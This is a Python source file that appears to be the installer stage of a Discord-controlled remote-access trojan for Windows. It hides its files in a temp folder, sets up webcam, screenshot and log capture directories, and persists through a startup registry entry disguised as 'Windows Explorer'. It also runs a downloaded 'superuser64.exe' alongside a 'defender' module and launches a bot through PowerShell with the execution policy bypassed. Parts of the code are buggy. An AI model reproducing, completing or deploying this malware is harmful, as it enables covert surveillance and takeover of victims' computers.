import asyncio
import os
import subprocess
import venv
import ThreadManager
import sys


async def Hide():
    folderTarg = "%temp%\\123456789\\"
    payload = r"echo {}".format(folderTarg)
    execute = subprocess.run(payload, shell=True, capture_output=True)
    folder = execute.stdout
    print(folder.decode(encoding="utf-8"))
    folder = folder.decode(encoding="utf-8")
    folderstr = folder.replace(r"\\", "\\").replace("\r\n", "")
    print(folderstr)

    try:
        await getSettled(folderstr)
    except Exception as e:
        print("An error has occured: " + str(e))
    os.chdir(folderstr)



async def getSettled(targetDir):
    try:
        os.mkdir(targetDir)
        os.mkdir("{}\\downloads".format(targetDir))
        os.mkdir("{}\\WebcamCaptures".format(targetDir))
        os.mkdir("{}\\ScreenShots".format(targetDir))
        os.mkdir("{}\\logs".format(targetDir))
    except FileExistsError:
        pass
    payload = "copy .\\*.py {}\\ && copy .\\*.bat {}\\ && copy .\\.env {}\\ ".format(targetDir, targetDir, targetDir)
    copyAllNecessary = subprocess.run(payload, shell=True, capture_output=True)
    if copyAllNecessary.stderr.__len__() > 0: raise Exception(copyAllNecessary.stderr)
    
    # Create the virtual environment
    venv_dir = os.path.join(targetDir, "venv")
    venv.create(venv_dir, clear=True, with_pip=True)
    """
    # Activate the virtual environment and install packages
    activate_script = os.path.join(venv_dir, "Scripts", "activate.bat")
    pip_install_cmd = f"{activate_script}" # "; pip install intents aiohttp pillow legacy-cgi audioop-lts pynput python-dotenv opencv-python git+https://github.com/Rapptz/discord.py@master"
    goAhead = subprocess.run(pip_install_cmd, shell=True, capture_output=True)
    env = os.environ
    goAhead2 = subprocess.Popen("python.exe -m pip install pillow pynput python-dotenv opencv-python pyaudio", shell=True, env=env)
    #thread = ThreadManager.ThreadManager("DiscordPYInstall", subprocess.run(args="python.exe -m pip install git+https://github.com/Rapptz/discord.py@master",shell=True))
    subprocess.run(args="python.exe -m pip install git+https://github.com/Rapptz/discord.py@master", shell=True, env=env)
    print(goAhead.stdout.decode(), goAhead.stderr.decode(), sep="\n\n\n")"""
 

async def Activated(targetDir):
    import persist

    persist.add_to_startup_registry("Windows Explorer", "python.exe {}\\discordbot.py".format(targetDir), True)
    
    import defender

    targetFile = "downloads\\superuser64.exe /ws"
    defenderFile = ".\\defender.py && .\\ThreadManager.py"
    payload = "{0} python.exe {1}".format(targetFile, defenderFile)
    docoolstuff = subprocess.run(payload, shell=True, capture_output=True)
    print(docoolstuff.stdout.decode("utf-8"), docoolstuff.stderr.decode("utf-8"), sep="\n\n")
    
    botFile = os.path.join(targetDir, "run_discordbot.bat")
    botpayload = repr("shell=True, capture_output=True, args=f'[os.getcwd()]\\{0} powershell.exe -ExecutionPolicy Bypass -Command $& {1}$'".format(targetFile, botFile).replace("[", "{").replace("]","}"))
    print(botpayload)
    
    
    return botpayload

async def runBotBatch(payload):
    directory = os.listdir()
    for i in range(len(directory)):
        if "run_discordbot.bat" == i:
            botFile = directory[i]
    
            print(f"Running batch file: {botFile}")

    #startBot = subprocess.run(botpayload, shell=True, capture_output=True)
    thread1 = ThreadManager.ThreadManager(target=printNewFile, args=payload, name="DiscordBot")
    thread1.start()
    print("Joining the writing thread")
    thread1.join()

    print("Starting the final python installer file")
    print("{0}\\venv\\Scripts\\python.exe {1}\\coolfile.py".format(os.getcwd(), os.getcwd()))
    proc = await asyncio.create_subprocess_shell("coolfile.py", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    stdout, stderr = await proc.communicate()
    if stdout:
        print(stdout.decode())
    if stderr:
        print(stderr.decode())

async def stampBatch():
    print(os.getcwd())    
    with open("run_discordbot.bat", "w+") as file:
        allAsList = file.readlines()
        for i in allAsList:
            numberPos = allAsList[i].index()

            if "&&CURDIR&&" in i:
                print("FOUND &&CURDIR&& \nLine = {}".format(i))
                allAsList[numberPos] = i.replace(old="&&CURDIR&&", new="{}".format(os.getcwd()))
            elif "&&VENVDIR&&" in i:
                print("FOUND &&VENVDIR&& \nLine = {}".format(i))
                allAsList[numberPos] = i.replace(old="&&VENVDIR&&", new="{}".format(os.getcwd()))

            print(i)
            file.close()

def printNewFile(payload):
    fileConts = """
import subprocess\r\n
import os\r\n
\r\n
\r\n
\r\n

class NewFile():\r\n
\tdef __init__(self):\r\n
\t\tself.thread = subprocess.run({})\r\n
\t\tprint('SUCCESS STARTING NEW THREAD')\r\n
\t\tprint(self.thread)\r\n
if __name__ == '__main__':\r\n
\tmain = NewFile()\r\n
\tprint(main.thread.returncode)\r\n
\tprint(main.thread.args)\r\n
""".format(payload).replace('"', '').replace("$", '"').encode()
    print(payload, "\n\n\n\n")
    print(fileConts) 
    with open("coolfile.py", "wb") as file:
        file.write(fileConts)
        file.close()

async def main():
    
    await Hide()
    act = await Activated(os.getcwd())
    print(act)
    await stampBatch()
    #await asyncio.sleep(10)
    await runBotBatch(act)
    print("Hoi from async")

if __name__ == "__main__":
    asyncio.run(main())
    print("Hoi from main")